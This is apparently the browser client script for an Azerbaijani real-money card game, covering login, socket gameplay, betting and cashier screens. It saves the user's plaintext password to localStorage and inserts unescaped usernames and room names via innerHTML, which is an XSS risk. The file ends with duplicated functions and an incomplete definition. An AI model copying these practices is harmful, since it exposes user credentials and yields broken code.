// Service Worker-i ləğv et (Yükləmə xətalarını aradan qaldırmaq üçün)
if ('serviceWorker' in navigator) {
    navigator.serviceWorker.getRegistrations().then(function(registrations) {
        for(let registration of registrations) {
            registration.unregister();
        }
    });
}

let socket = null;
let currentUsername = "";
let userBalance = 0;
let serverUrl = "";
let currentRoomId = "";
let myCards = [];
let allPlayersHands = {};
let currentMinBet = 0.2;
let potAmount = 0;
let acUnlocked = false;
let isMyTurn = false;
let playersInRoom = [];
let turnTimer = 0;
let currentTurn = "";
let isOvertime = false;
let isSplitWaiting = false;
let isSplitDisabled = false;
let isSekaWaiting = false;
let isSekaDisabled = false;
let hasJoinedSeka = false;
let isTyomnuActive = false;
let isTyomnuChainInProgress = false;
let tyomnuTimeLeft = 0;
let tyomnuInterval = null;

// 0. Səslər
const sounds = {
    card: new Audio("sounds/card_sound.mp3"),
    money: new Audio("sounds/money.mp3"),
    bank: new Audio("sounds/bank.mp3"),
    pas: new Audio("sounds/pas.mp3"),
    open: new Audio("sounds/open.mp3"),
    win: new Audio("sounds/win.mp3"),
    meglub: new Audio("sounds/meglub.mp3"),
    seka: new Audio("sounds/seka.mp3"),
    tyomnu: new Audio("sounds/tyomnu.mp3"),
    patyomnu: new Audio("sounds/patyomnu.mp3"),
    pulbolundu: new Audio("sounds/pulbolundu.mp3")
};

function playSound(name) {
    if(sounds[name]) {
        sounds[name].currentTime = 0;
        sounds[name].play().catch(e => console.log("Səs çalınmadı (İstifadəçi aktivliyi lazımdır)"));
    }
}

function getCardFileName(card) {
    if (!card || card === "back") return "images/card_back.png";
    const valueStr = card.substring(0, card.length - 1);
    const suitChar = card.slice(-1);

    let v = valueStr;
    if (v === "A") v = "14";
    else if (v === "K") v = "13";
    else if (v === "Q") v = "12";
    else if (v === "J") v = "11";

    const s = {
        "\u2663": "c", "\u2666": "d", "\u2665": "h", "\u2660": "s",
        "♣": "c", "♦": "d", "♥": "h", "♠": "s"
    }[suitChar] || "back";

    return `images/card_${v}_${s}.png`;
}

// 1. URL oxuma (Android AppConfig.kt məntiqi ilə eyni)
const ENCODED_LINK = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3RydW1wci9tZXRuL21haW4vdXJsLnR4dA==";

async function fetchServerUrl() {
    try {
        // Base64 decoding (atob)
        const urlToFetch = atob(ENCODED_LINK);

        const response = await fetch(urlToFetch);
        let rawUrl = await response.text();
        rawUrl = rawUrl.trim();

        // Təmir rejimi yoxlanışı
        if (rawUrl === "TEMIR" || rawUrl === "MAINTENANCE") {
            showScreen("maintenance-screen");
            return false;
        }

        if (rawUrl) {
            let url = rawUrl;
            if (!url.startsWith("http")) {
                url = "https://" + url;
            }
            serverUrl = url.endsWith("/") ? url : url + "/";
            return true;
        }
    } catch (e) {
        console.error("URL oxunmadı:", e);
        alert("Server bağlantısı qurulmadı. İnterneti yoxlayın.");
    }
    return false;
}

// 2. Navigation
function showScreen(id) {
    document.querySelectorAll(".screen").forEach(s => s.classList.remove("active"));
    document.getElementById(id).classList.add("active");
}

document.getElementById("go-to-register").onclick = (e) => { e.preventDefault(); showScreen("register-screen"); };
document.getElementById("go-to-login").onclick = (e) => { e.preventDefault(); showScreen("login-screen"); };
document.getElementById("lobby-back").onclick = () => showScreen("main-screen");
document.getElementById("game-leave").onclick = () => { if(socket) socket.emit("leaveRoom"); showScreen("lobby-screen"); };

// 3. Auth
document.getElementById("login-btn").onclick = async () => {
    const user = document.getElementById("username").value;
    const pass = document.getElementById("password").value;
    await performLogin(user, pass);
};

document.getElementById("register-btn").onclick = async () => {
    const user = document.getElementById("reg-username").value;
    const pass = document.getElementById("reg-password").value;
    const phone = document.getElementById("reg-phone").value;
    await performRegister(user, pass, phone);
};

async function performRegister(user, pass, phone) {
    if(!user || !pass || !phone) {
        document.getElementById("reg-error-msg").innerText = "Bütün xanaları doldurun!";
        return;
    }

    try {
        const resp = await fetch(serverUrl + "register", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ username: user, password: pass, phone: phone })
        });
        if(resp.ok) {
            alert("Qeydiyyat uğurludur! Giriş edə bilərsiniz.");
            showScreen("login-screen");
        } else {
            const msg = await resp.text();
            document.getElementById("reg-error-msg").innerText = msg || "Xəta baş verdi!";
        }
    } catch(e) { alert("Server xətası!"); }
}

async function performLogin(user, pass) {
    if(!user || !pass) return;

    try {
        const resp = await fetch(serverUrl + "login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ username: user, password: pass })
        });
        const data = await resp.json();
        if(resp.ok) {
            currentUsername = data.user.username;
            userBalance = data.user.balance;

            // Məlumatları yadda saxla
            localStorage.setItem("saved_user", user);
            localStorage.setItem("saved_pass", pass);

            updateUIInfo();
            startSocket();
            showScreen("main-screen");
        } else {
            document.getElementById("error-msg").innerText = "Səhv məlumat!";
            localStorage.removeItem("saved_user");
            localStorage.removeItem("saved_pass");
        }
    } catch(e) { alert("Server xətası!"); }
}

function updateUIInfo() {
    const balStr = userBalance.toFixed(2) + " ₼";
    const mainDispName = document.getElementById("main-display-name");
    const mainDispBal = document.getElementById("main-display-balance");
    const gameDispBal = document.getElementById("game-balance-display");

    if (mainDispName) mainDispName.innerText = currentUsername;
    if (mainDispBal) mainDispBal.innerText = balStr;
    if (gameDispBal) {
        // Oyun ekranındakı balansa kliklədikdə dərhal deposit açılır
        gameDispBal.innerHTML = balStr + ' <span class="plus-btn" id="game-plus-btn">+</span>';
        document.getElementById("game-plus-btn").onclick = (e) => {
            e.stopPropagation();
            showDepositModal();
        };
    }
}

// 4. Socket & Lobby
function startSocket() {
    socket = io(serverUrl);
    socket.on("connect", () => socket.emit("identify", currentUsername));

    socket.on("balance", (bal) => {
        userBalance = Number(bal);
        updateUIInfo();
        updateControls(); // Balans dəyişəndə düymələri yenilə
    });

    socket.on("timer", (t) => {
        turnTimer = Number(t);
        updateTimerOnly();
    });

    socket.on("timerOvertime", (status) => {
        isOvertime = status;
        updateTimerOnly();
        updateControls(); // Overtime başlayanda düymələri (AÇ və s.) yenilə
    });

    socket.on("gameCountdown", (timeLeft) => {
        const msgEl = document.getElementById("game-message");
        const msgCont = document.getElementById("game-message-container");
        if (msgEl && msgCont) {
            if (timeLeft > 0) {
                msgEl.innerText = timeLeft;
                msgCont.style.display = "flex";
            } else {
                msgCont.style.display = "none";
            }
        }
    });

    socket.on("turn", (username) => {
        currentTurn = username;
        // Böyük-kiçik hərf fərqini aradan qaldırırıq
        isMyTurn = (username.toLowerCase() === currentUsername.toLowerCase());
        updateControls();
    });

    socket.on("minBetUpdate", (mb) => {
        currentMinBet = Number(mb);
        document.getElementById("label-bet-amt").innerText = currentMinBet.toFixed(2);
        updateControls();
    });

    socket.on("acUnlocked", (status) => {
        acUnlocked = status;
        updateControls();
    });

    socket.on("potUpdate", (pot) => {
        const amt = Number(pot);
        potAmount = amt;
        document.getElementById("pot-amount").innerText = amt.toFixed(2) + " ₼";
        document.getElementById("label-bank-amt").innerText = amt.toFixed(2);

        // Pul varsa yığını göstər (Android 5-li sikkə)
        const pile = document.getElementById("pot-coins-pile");
        if (pile) pile.style.display = amt > 0 ? "block" : "none";

        updateControls();
    });

    socket.on("actionSound", (name) => {
        const soundMap = { "pas": "pas", "money": "money", "bank": "bank", "open": "open", "tyomnu": "tyomnu", "patyomnu": "patyomnu" };
        if(soundMap[name]) playSound(soundMap[name]);
    });

    socket.on("playerBet", (data) => {
        animateCoin(data.username, data.amount, "BET");
    });

    socket.on("cards", (cards) => {
        myCards = cards;
        revealProgress = 0;
        updateMyCardsUI();
        playSound("card");

        // Kartlar gələndə mesajı gizlət
        const msgCont = document.getElementById("game-message-container");
        if (msgCont) msgCont.style.display = "none";
    });

    socket.on("gameResult", (data) => {
        // Android-dəki delay(1500) məntiqi: Kartlar açılmadan əvvəl gözləmə
        setTimeout(() => {
            if (data.allHands) {
                allPlayersHands = data.allHands;
                updateTableUI(playersInRoom);
            }

            // Qalib üçün pul uçuşu (Android-dəki kimi 4s)
            if (!data.isSeka && data.pot > 0 && data.winner !== "BÖLÜNDÜ") {
                animateCoin(data.winner, data.pot, "WIN");
            }

            if(data.isSeka) {
                playSound("seka");
                // Seka olanda əgər iştirakçıyıqsa, statusu qeyd edirik
                // Bu, serverdən gələn sekaOffer zamanı modalın çıxmaması üçün lazımdır
            }
            else if(data.winner === "BÖLÜNDÜ") playSound("pulbolundu");
            else if(data.winner === currentUsername) playSound("win");
            else playSound("meglub");

            // Nəticəni ekranda göstər
            const msgEl = document.getElementById("game-message");
            const msgCont = document.getElementById("game-message-container");
            if (msgEl && msgCont) {
                if (data.isSeka) {
                    msgEl.innerText = data.winner;
                } else {
                    msgEl.innerText = (data.winner === "BÖLÜNDÜ") ? "PUL BÖLÜNDÜ" : `Qalib: ${data.winner}`;
                }
                msgCont.style.display = "flex";
            }
        }, 1500);
    });

    socket.on("clearResult", () => {
        myCards = [];
        allPlayersHands = {};
        isSplitWaiting = false;
        isSplitDisabled = false;
        isSekaWaiting = false;
        isSekaDisabled = false;
        hasJoinedSeka = false;
        isTyomnuActive = false;
        isTyomnuChainInProgress = false;
        revealProgress = 0; // Reset reveal progress
        updateMyCardsUI();
        hideModal();
        document.getElementById("bets-layer").innerHTML = ""; // Mərcləri təmizlə

        // Mesajı sıfırla
        const msgEl = document.getElementById("game-message");
        const msgCont = document.getElementById("game-message-container");
        if (msgEl && msgCont) {
            msgEl.innerText = "Yeni raund gözlənilir...";
            msgCont.style.display = "flex";
        }
    });

    socket.on("splitOffer", (data) => {
        showOfferModal("BÖLƏK?", `${data.from} pulu bölməyi təklif edir`, () => {
            socket.emit("respondSplit", { roomId: currentRoomId, accept: true });
        }, () => {
            socket.emit("respondSplit", { roomId: currentRoomId, accept: false });
        }, "RAZIYAM", "RƏDD ET");
    });

    socket.on("splitRejected", () => {
        isSplitWaiting = false;
        isSplitDisabled = true;
        updateControls();
    });

    socket.on("manualSekaOffer", (data) => {
        showOfferModal("SEKA?", `${data.from} seka etməyi təklif edir`, () => {
            socket.emit("respondSeka", { roomId: currentRoomId, accept: true });
        }, () => {
            socket.emit("respondSeka", { roomId: currentRoomId, accept: false });
        }, "RAZIYAM", "RƏDD ET");
    });

    socket.on("sekaRejected", () => {
        isSekaWaiting = false;
        isSekaDisabled = true;
        updateControls();
    });

    socket.on("sekaOffer", (data) => {
        const participants = data.participants || [];
        const isParticipant = participants.some(p => p.toLowerCase() === currentUsername.toLowerCase());

        if (isParticipant) {
            // Əgər biz zatən Seka iştirakçısıyıqsa, pəncərə göstərmirik
            hasJoinedSeka = true;
            return;
        }

        // Kənar oyunçular üçün təklif
        const cost = data.cost || 0;
        showOfferModal("SEKA!", `Giriş: ${cost.toFixed(2)} ₼`, () => {
            if (userBalance >= cost) {
                socket.emit("joinSeka", { roomId: currentRoomId, username: currentUsername });
                hasJoinedSeka = true;
            } else {
                alert("Balans kifayət deyil!");
                showDepositModal();
            }
        }, () => {
            // İzləyici qal
        }, "QOŞUL", "İzləyici qal");
    });

    socket.on("resetSplitStatus", () => {
        isSplitDisabled = false;
        isSekaDisabled = false;
        updateControls();
    });

    socket.on("tyomnuOffer", (data) => {
        const amount = data.amount || 0;
        showTyomnuModal(amount);
    });

    socket.on("tyomnuStateUpdate", (data) => {
        isTyomnuActive = data.active;
        isTyomnuChainInProgress = data.chainInProgress;
        updateControls();
        // If chain is in progress, reset peek
        if (isTyomnuChainInProgress) {
            revealProgress = 0;
            updateMyCardsUI();
        }
    });

    socket.on("topupStarted", (data) => {
        showTopupModal(`${data.username} balans artırır...`);
    });

    socket.on("topupTimer", (t) => {
        document.getElementById("topup-timer").innerText = t;
    });

    socket.on("topupEnded", () => {
        hideModal();
    });

    socket.on("error", (msg) => {
        if(msg.toLowerCase().includes("balans")) {
             showDepositModal();
        } else {
             alert(msg);
        }
    });

    socket.on("roomCounts", (data) => {
        const list = document.getElementById("rooms-list");
        list.innerHTML = "";
        Object.keys(data).forEach(rid => {
            if(rid === "Lobbi") return;
            const r = data[rid];
            const div = document.createElement("div");
            div.className = "room-item";

            const isFull = r.count >= 6;

            div.innerHTML = `
                <div class="room-left">
                    <div class="room-bet-badge">${r.bet.toFixed(2)} ₼</div>
                    <div class="room-details">
                        <div class="room-name-row">
                            <h4>${rid}</h4>
                            ${r.hasPassword ? '<span>🔒</span>' : ''}
                        </div>
                        <span class="room-label-tiny">Giriş Məbləği</span>
                    </div>
                </div>
                <div class="room-right ${isFull ? 'full' : ''}">
                    <span class="group-icon">👥</span>
                    <span>${r.count}/6</span>
                </div>
            `;
            div.onclick = () => {
                if (r.hasPassword) {
                    const pass = prompt("Bu otaq şifrəlidir. Şifrəni daxil edin:");
                    if (pass !== null) joinRoom(rid, r.bet, pass);
                } else {
                    joinRoom(rid, r.bet);
                }
            };
            list.appendChild(div);
        });
    });

    socket.on("players", (players) => updateTableUI(players));

    socket.on("userRequests", (requests) => {
        const list = document.getElementById("history-list");
        if (!list) return;
        list.innerHTML = "";

        if (requests.length === 0) {
            list.innerHTML = "<p style='text-align:center; color:gray;'>Hələ sorğunuz yoxdur.</p>";
            return;
        }

        requests.sort((a,b) => b.id - a.id).forEach(req => {
            const div = document.createElement("div");
            div.className = "history-item";
            const statusColor = req.status === "approved" ? "#4CAF50" : (req.status === "rejected" ? "#f44336" : "#FF9800");
            div.innerHTML = `
                <div style="display:flex; justify-content:space-between; margin-bottom:5px;">
                    <b style="color:${req.type === 'deposit' ? '#4CAF50' : '#E91E63'}">${req.type === 'deposit' ? 'ARTIM' : 'ÇIXARIŞ'}</b>
                    <span style="color:${statusColor}; font-weight:bold;">${req.status.toUpperCase()}</span>
                </div>
                <div style="display:flex; justify-content:space-between; font-size:12px;">
                    <span>${req.amount.toFixed(2)} ₼</span>
                    <span style="color:gray;">${req.date}</span>
                </div>
            `;
            div.style.borderBottom = "1px solid #eee";
            div.style.padding = "10px 0";
            list.appendChild(div);
        });
    });
}

function joinRoom(rid, bet, password = null) {
    currentRoomId = rid;
    document.getElementById("room-id-display").innerText = rid;
    const data = { roomId: rid, username: currentUsername, initialBet: bet };
    if (password) data.password = password;
    socket.emit("joinRoom", data);
    showScreen("game-screen");
}

// 5. Table UI
function calculateGameScore(hand) {
    if (!hand || hand.length === 0) return 0.0;
    if (hand.length === 3 && hand.every(c => c.startsWith("A"))) return 33.0;

    function getCardValue(card) {
        const rank = card.substring(0, card.length - 1);
        if (rank === "A") return 11;
        if (["K", "Q", "J", "10"].includes(rank)) return 10;
        return parseInt(rank) || 0;
    }

    const suits = {
        "\u2663": 0, "\u2666": 0, "\u2665": 0, "\u2660": 0,
        "♣": 0, "♦": 0, "♥": 0, "♠": 0
    };
    hand.forEach(c => {
        const s = c.slice(-1);
        suits[s] = (suits[s] || 0) + getCardValue(c);
    });

    let maxScore = Math.max(...Object.values(suits));

    const aceCount = hand.filter(c => c.startsWith("A")).length;
    if (aceCount === 2 && 22.0 > maxScore) maxScore = 22.0;

    const ranks = {};
    hand.forEach(c => {
        const r = c.substring(0, c.length - 1);
        ranks[r] = (ranks[r] || 0) + 1;
    });

    Object.keys(ranks).forEach(r => {
        if (ranks[r] === 3) {
            let tripleScore = 0;
            if (r === "A") tripleScore = 33.0;
            else if (r === "6") tripleScore = 32.5;
            else if (r === "7") tripleScore = 21.0;
            else if (r === "8") tripleScore = 24.0;
            else if (r === "9") tripleScore = 27.0;
            else if (["10", "J", "Q", "K"].includes(r)) tripleScore = 30.0;

            if (tripleScore > maxScore) maxScore = tripleScore;
        }
    });

    return maxScore;
}

function updateTableUI(players) {
    playersInRoom = players;
    const layer = document.getElementById("players-layer");
    if (!layer) return;
    layer.innerHTML = "";

    // Böyük-kiçik hərf fərqinə baxmadan özümüzü tapırıq
    const myIdx = players.findIndex(p => p && p.username && p.username.toLowerCase() === currentUsername.toLowerCase());

    const screenW = window.innerWidth;
    const screenH = window.innerHeight;
    const radiusX = screenW * 0.35;
    const radiusY = screenH * 0.18;
    const centerX = screenW / 2;
    const centerY = screenH * 0.45; // 0.40-dan 0.45-ə (aşağı salındı)

    players.forEach((p, i) => {
        if(!p || !p.username) return;

        // Əgər özümüzü tapmamışıqsa, nizam pozulmasın deyə i-ni istifadə edirik
        const relativeIdx = myIdx === -1 ? i : (i - myIdx + 6) % 6;
        const angle = (90 + relativeIdx * 60) * (Math.PI / 180);

        let x = centerX + radiusX * Math.cos(angle);
        let y = centerY + radiusY * Math.sin(angle);

        if (relativeIdx === 0 && myIdx !== -1) {
            y += 45;
        }

        const div = document.createElement("div");
        div.className = "player-item";
        div.id = "player-" + p.username;

        if (relativeIdx >= 2 && relativeIdx <= 4) {
            div.classList.add("pos-top");
        }

        if(p.isCurrentTurn) div.classList.add("active");
        if(p.folded) div.classList.add("folded");

        div.style.left = x + "px";
        div.style.top = y + "px";

        let cardsHtml = "";
        let scoreHtml = "";
        if (p.isPlaying && !p.folded) {
            const hand = allPlayersHands[p.username];
            cardsHtml = `<div class="player-cards">`;
            if (hand) {
                hand.forEach(c => {
                    cardsHtml += `<img src="${getCardFileName(c)}" class="mini-card">`;
                });
                const score = calculateGameScore(hand);
                scoreHtml = `<div class="player-score">${score.toFixed(1)}</div>`;
            } else {
                for(let k=0; k<3; k++) cardsHtml += `<img src="${getCardFileName('back')}" class="mini-card">`;
            }
            cardsHtml += `</div>`;
        }

        const isMe = p.username.toLowerCase() === currentUsername.toLowerCase();
        const passBadge = p.folded ? `<div class="pass-badge">PAS</div>` : "";

        div.innerHTML = `
            ${scoreHtml}
            ${cardsHtml}
            <div class="player-avatar">
                ${passBadge}
                <span class="avatar-letter">${p.username.charAt(0).toUpperCase()}</span>
                <div class="timer-display" style="display: ${p.isCurrentTurn ? 'flex' : 'none'}">${turnTimer}</div>
            </div>
            <div class="player-name">${isMe ? "MƏN" : p.username.toUpperCase()}</div>
        `;
        layer.appendChild(div);
    });
}

function animateCoin(username, amount, type) {
    const playerDiv = document.getElementById("player-" + username);
    if (!playerDiv) return;

    const layer = document.getElementById("bets-layer");
    const rect = playerDiv.getBoundingClientRect();
    const containerRect = document.querySelector(".table-container").getBoundingClientRect();

    // Player position relative to container
    const pX = rect.left + rect.width / 2 - containerRect.left;
    const pY = rect.top + rect.height / 2 - containerRect.top;

    // Center position
    const cX = containerRect.width / 2;
    const cY = containerRect.height * 0.45; // Pot mərkəzi ilə eyni (aşağı salındı)

    const coin = document.createElement("div");
    coin.className = `flying-coin ${type === "BET" ? "coin-bet" : "coin-win"}`;
    coin.style.setProperty("--start-x", pX + "px");
    coin.style.setProperty("--start-y", pY + "px");
    coin.style.setProperty("--center-x", cX + "px");
    coin.style.setProperty("--center-y", cY + "px");

    coin.innerHTML = `
        <img src="images/monet.jpg" style="width:100%; height:auto; border-radius:50%;">
        <div class="coin-amount-tag">${type === "BET" ? "-" : "+"}${amount.toFixed(2)} ₼</div>
    `;

    layer.appendChild(coin);

    // Animasiya bitəndə elementi sil (Android delay-lərinə uyğun)
    setTimeout(() => coin.remove(), type === "BET" ? 2100 : 4100);
}

function updateTimerOnly() {
    // Bütün oyunçularda taymeri gizlət və aktiv klassını sil
    document.querySelectorAll(".timer-display").forEach(td => td.style.display = "none");
    document.querySelectorAll(".player-item").forEach(pi => pi.classList.remove("active"));

    // Sırası olan oyunçunu tap və taymeri yenilə
    if (currentTurn) {
        const playerDiv = document.getElementById("player-" + currentTurn);
        if (playerDiv) {
            const timerDiv = playerDiv.querySelector(".timer-display");
            if (timerDiv) {
                timerDiv.innerText = turnTimer;
                timerDiv.style.display = "flex";
                timerDiv.style.color = isOvertime ? "#ff4444" : "white";
            }
            playerDiv.classList.add("active");
        }
    }

    // PAS düyməsində saniyəni yenilə
    updatePassButtonText();
}

function updatePassButtonText() {
    const passBtn = document.getElementById("btn-pass");
    if (isMyTurn && myCards.length > 0) {
        passBtn.innerHTML = `PAS<br>(${turnTimer})`;
        if (isOvertime) passBtn.style.backgroundColor = "#ff4444";
        else passBtn.style.backgroundColor = "#444";
    } else {
        passBtn.innerHTML = "PAS";
        passBtn.style.backgroundColor = "#444";
    }
}

let revealProgress = 0;
let isDraggingPeek = false;
let startX = 0;

// Initialize peek events once
function initPeekEvents() {
    const handleStart = (e) => {
        const container = document.querySelector(".peek-container");
        if (!container) return;
        isDraggingPeek = true;
        startX = (e.type.includes("touch") ? e.touches[0].clientX : e.clientX) - (revealProgress * container.offsetWidth * 0.8);
    };

    const handleMove = (e) => {
        if (!isDraggingPeek) return;
        const container = document.querySelector(".peek-container");
        const frontLayer = document.querySelector(".cards-layer.front");
        const scoreDiv = document.querySelector(".my-score-display");
        const hint = document.querySelector(".peek-hint");

        if (!container || !frontLayer) return;

        const currentX = e.type.includes("touch") ? e.touches[0].clientX : e.clientX;
        const diff = currentX - startX;
        const containerWidth = container.offsetWidth;

        if (isTyomnuChainInProgress) return; // Disable peek if Tyomnu chain is active

        const newProgress = Math.max(0, Math.min(1, diff / (containerWidth * 0.8)));
        if (newProgress !== revealProgress) {
            revealProgress = newProgress;
            frontLayer.style.clipPath = `inset(0 ${100 - (revealProgress * 100)}% 0 0)`;
            if (revealProgress > 0.8) {
                if (scoreDiv) scoreDiv.classList.add("visible");
                if (hint) hint.innerText = "";
            }
        }
    };

    const handleEnd = () => {
        isDraggingPeek = false;
    };

    window.addEventListener("mousedown", (e) => { if(e.target.closest(".peek-container")) handleStart(e); });
    window.addEventListener("mousemove", handleMove);
    window.addEventListener("mouseup", handleEnd);

    window.addEventListener("touchstart", (e) => { if(e.target.closest(".peek-container")) handleStart(e); }, { passive: true });
    window.addEventListener("touchmove", handleMove, { passive: false });
    window.addEventListener("touchend", handleEnd);
}

function updateMyCardsUI() {
    const container = document.getElementById("my-cards-container");
    container.innerHTML = "";
    if (myCards.length === 0) {
        revealProgress = 0;
        updateControls();
        return;
    }

    const score = calculateGameScore(myCards);

    const hint = document.createElement("div");
    hint.className = "peek-hint";
    hint.innerText = revealProgress > 0.8 ? "" : "Açmaq üçün sürüşdür ➔";
    container.appendChild(hint);

    const scoreDiv = document.createElement("div");
    scoreDiv.className = "my-score-display" + (revealProgress > 0.8 ? " visible" : "");
    scoreDiv.innerText = "XAL: " + score.toFixed(1);
    container.appendChild(scoreDiv);

    const peekContainer = document.createElement("div");
    peekContainer.className = "peek-container";

    const backLayer = document.createElement("div");
    backLayer.className = "cards-layer back";
    for(let i=0; i<3; i++) {
        const img = document.createElement("img");
        img.src = getCardFileName("back");
        img.className = "peek-card";
        backLayer.appendChild(img);
    }

    const frontLayer = document.createElement("div");
    frontLayer.className = "cards-layer front";
    frontLayer.style.clipPath = `inset(0 ${100 - (revealProgress * 100)}% 0 0)`;

    myCards.forEach(card => {
        const img = document.createElement("img");
        img.src = getCardFileName(card);
        img.className = "peek-card";
        frontLayer.appendChild(img);
    });

    peekContainer.appendChild(backLayer);
    peekContainer.appendChild(frontLayer);
    container.appendChild(peekContainer);

    updateControls();
}

function sendAction(action, amount = null) {
    if (!socket || !currentRoomId) return;
    const data = { roomId: currentRoomId, action: action };
    if (amount !== null) data.amount = amount;
    socket.emit("action", data);
}

function updateControls() {
    const hasCards = myCards.length > 0;
    const passBtn = document.getElementById("btn-pass");
    const betBtn = document.getElementById("btn-bet");
    const bankBtn = document.getElementById("btn-bank");
    const openBtn = document.getElementById("btn-open");
    const splitBtn = document.getElementById("btn-split");
    const sekaBtn = document.getElementById("btn-seka");

    if (!passBtn || !betBtn || !bankBtn || !openBtn) return;

    // Düymələrin aktivlik vəziyyəti
    passBtn.disabled = !(isMyTurn && hasCards);
    updatePassButtonText();

    const betNeeded = (currentMinBet > potAmount && potAmount > 0) ? potAmount : currentMinBet;
    betBtn.disabled = !(isMyTurn && hasCards && userBalance >= betNeeded);
    betBtn.innerHTML = `ARTIR<br><span>${betNeeded.toFixed(2)}</span> ₼`;

    bankBtn.disabled = !(isMyTurn && hasCards && potAmount > 0 && userBalance >= potAmount);
    bankBtn.innerHTML = `BANK<br><span>${potAmount.toFixed(2)}</span> ₼`;

    openBtn.disabled = !(isMyTurn && hasCards && acUnlocked && !isOvertime && !isTyomnuActive);

    // Aktiv oyunçu sayını hesabla (Bölək və Seka üçün)
    const activeCount = playersInRoom.filter(p => p && p.isPlaying && !p.folded).length;

    splitBtn.disabled = !(isMyTurn && hasCards && acUnlocked && activeCount === 2 && !isSplitWaiting && !isSplitDisabled);
    splitBtn.innerText = isSplitWaiting ? "GÖZLƏ..." : "BÖLƏK";

    sekaBtn.disabled = !(isMyTurn && hasCards && acUnlocked && activeCount === 2 && !isSekaWaiting && !isSekaDisabled);
    sekaBtn.innerText = isSekaWaiting ? "GÖZLƏ..." : "SEKA";
}

function showOfferModal(title, text, onAccept, onReject, acceptText = "RAZIYAM", rejectText = "RƏDD ET") {
    showModal("offer-modal");

    document.getElementById("modal-title").innerText = title;
    document.getElementById("modal-text").innerText = text;
    document.getElementById("modal-accept-btn").innerText = acceptText;
    document.getElementById("modal-reject-btn").innerText = rejectText;

    document.getElementById("modal-accept-btn").onclick = () => {
        onAccept();
        hideModal();
    };
    document.getElementById("modal-reject-btn").onclick = () => {
        onReject();
        hideModal();
    };
}

function showTopupModal(text) {
    showModal("topup-modal");
    document.getElementById("topup-text").innerText = text;
}

function showTyomnuModal(amount) {
    showModal("tyomnu-modal");
    let timeLeft = 5;
    const titleEl = document.getElementById("tyomnu-title");
    const textEl = document.getElementById("tyomnu-text");
    const acceptBtn = document.getElementById("tyomnu-accept-btn");
    const rejectBtn = document.getElementById("tyomnu-reject-btn");

    titleEl.innerText = `Tyomnu? (${timeLeft})`;
    textEl.innerText = `Qaranlıq qurmaq istəyirsən? (${amount.toFixed(2)} ₼)`;

    if(tyomnuInterval) clearInterval(tyomnuInterval);
    tyomnuInterval = setInterval(() => {
        timeLeft--;
        titleEl.innerText = `Tyomnu? (${timeLeft})`;
        if(timeLeft <= 0) {
            clearInterval(tyomnuInterval);
            socket.emit("respondTyomnu", { roomId: currentRoomId, accept: false });
            hideModal();
        }
    }, 1000);

    acceptBtn.onclick = () => {
        clearInterval(tyomnuInterval);
        socket.emit("respondTyomnu", { roomId: currentRoomId, accept: true });
        hideModal();
    };
    rejectBtn.onclick = () => {
        clearInterval(tyomnuInterval);
        socket.emit("respondTyomnu", { roomId: currentRoomId, accept: false });
        hideModal();
    };
}

// Android-style Dialog Management
function showModal(id) {
    // 1. Hide ALL possible modals first
    document.querySelectorAll(".modal-box, .app-dialog").forEach(m => {
        m.classList.remove("active");
        m.style.display = "none";
    });

    // 2. Show overlay and the specific modal
    const overlay = document.getElementById("modal-overlay");
    const target = document.getElementById(id);

    if(overlay) overlay.classList.add("active");
    if(target) {
        target.classList.add("active");
        target.style.display = "flex";
    }
}

function hideModal() {
    const overlay = document.getElementById("modal-overlay");
    if(overlay) overlay.classList.remove("active");

    document.querySelectorAll(".modal-box, .app-dialog").forEach(m => {
        m.classList.remove("active");
        m.style.display = "none";
    });

    if(otpInterval) clearInterval(otpInterval);
}

// Android-style Unified Cashier System
function switchCashierSection(sectionId) {
    // 1. Hide all sections
    document.querySelectorAll(".cashier-content").forEach(s => s.classList.remove("active"));

    // 2. Show the target section
    const target = document.getElementById(sectionId);
    if(target) target.classList.add("active");

    // 3. Handle Footer buttons visibility
    const backBtn = document.getElementById("cashier-back-btn");
    const closeBtn = document.getElementById("cashier-close-btn");

    if (sectionId === "panel-section") {
        if(backBtn) backBtn.style.display = "none";
        if(closeBtn) closeBtn.style.display = "block";
    } else {
        if(backBtn) backBtn.style.display = "block";
        if(closeBtn) closeBtn.style.display = "none";
    }

    // 4. If history, fetch data
    if(sectionId === "history-section" && socket) {
        socket.emit("getUserRequests", currentUsername);
    }
}

function showUserPanel() {
    showModal("cashier-container");
    switchCashierSection("panel-section");
}

function showDepositModal() {
    showModal("cashier-container");
    switchCashierSection("deposit-section");
}

function showBetModal() {
    const betNeeded = (currentMinBet > potAmount && potAmount > 0) ? potAmount : currentMinBet;
    const hint = `Min: ${betNeeded.toFixed(2)} | Balans: ${userBalance.toFixed(2)}`;

    document.getElementById("bet-modal-hint").innerText = hint;
    document.getElementById("bet-input").value = betNeeded.toFixed(2);

    showModal("bet-modal");
}

function showCreateRoomModal() {
    showModal("create-room-modal");
}

// Global Listeners for new Unified UI
document.addEventListener("DOMContentLoaded", () => {
    // Lobby Actions
    const createRoomBtn = document.getElementById("lobby-create-room-btn");
    if(createRoomBtn) createRoomBtn.onclick = () => showCreateRoomModal();

    document.getElementById("create-room-cancel-btn").onclick = () => hideModal();

    document.getElementById("create-room-submit-btn").onclick = () => {
        const name = document.getElementById("create-room-name").value.trim();
        const bet = parseFloat(document.getElementById("create-room-bet").value);
        const pass = document.getElementById("create-room-pass").value;

        if(!name) { alert("Otaq adını daxil edin!"); return; }
        if(isNaN(bet) || bet <= 0) { alert("Mərc məbləğini düzgün daxil edin!"); return; }

        joinRoom(name, bet, pass || null);
        hideModal();

        // Təmizlə
        document.getElementById("create-room-name").value = "";
        document.getElementById("create-room-bet").value = "";
        document.getElementById("create-room-pass").value = "";
    };

    const openBtn = document.getElementById("open-user-panel-btn");
    if(openBtn) openBtn.onclick = () => showUserPanel();

    // WhatsApp Paylaş düyməsi
    const shareWhatsappBtn = document.getElementById("share-whatsapp-btn");
    if (shareWhatsappBtn) {
        shareWhatsappBtn.onclick = () => {
            const currentUrl = window.location.href;
            const text = "3 Tuz Online oyununa qoşul! " + currentUrl;
            const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(text)}`;
            window.open(whatsappUrl, '_blank');
        };
    }
});

function showTopupModal(text) {
    showModal("topup-modal");
    document.getElementById("topup-text").innerText = text;
}

function showTyomnuModal(amount) {
    showModal("tyomnu-modal");
